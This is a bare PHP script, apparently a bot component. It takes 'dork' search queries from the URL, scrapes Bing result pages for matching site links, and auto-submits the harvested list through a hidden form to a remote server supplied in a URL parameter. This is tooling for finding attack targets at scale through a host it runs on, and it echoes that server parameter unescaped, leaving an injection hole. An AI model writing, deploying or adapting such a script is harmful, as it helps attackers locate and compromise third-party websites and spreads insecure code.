<?php 
$chave = md5($_SERVER[HTTP_HOST]);

if(!empty($_GET["dork"])) {

	$allLinks = array();
	$i=0;

	$dorks = $_GET["dork"];

	$dorks = explode("\n",$dorks);

	foreach ($dorks as $dork) {

	        $npages = 2500000;
	        $npage = 1;

	        while($npage <= $npages)
	        {
	        		echo $npage."<br>";
	                $link="http://www.bing.com/search?q=".urlencode($dork)."&first=" . $npage;
	                $x=@file_get_contents($link);

	                if($x) {
	                    preg_match_all("(<div class=\"sb_tlst\">.*<h3>.*<a href=\"(.*)\".*>(.*)</a>.*</h3>.*</div>)siU", $x, $findlink);

	                    foreach ($findlink[1] as $fl) {

	                        $allLinks[]=$fl;
	                        $i++;
	                    }
	                  
	                    $npage = $npage + 10;

	                    if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) { break; }
	                } else { break; }
	        }
	}
	$links = array_unique($allLinks); ?>
	<form action="<?php echo $_GET["server"]; ?>/<?php echo $chave; ?>" name="form" id="form" method="POST">
		<textarea name="urls"><?php foreach ($links as $link) { echo $link."\n"; } ?></textarea>
	</form>
	<script type="text/javascript">form.submit();</script>
	<?php
}
?>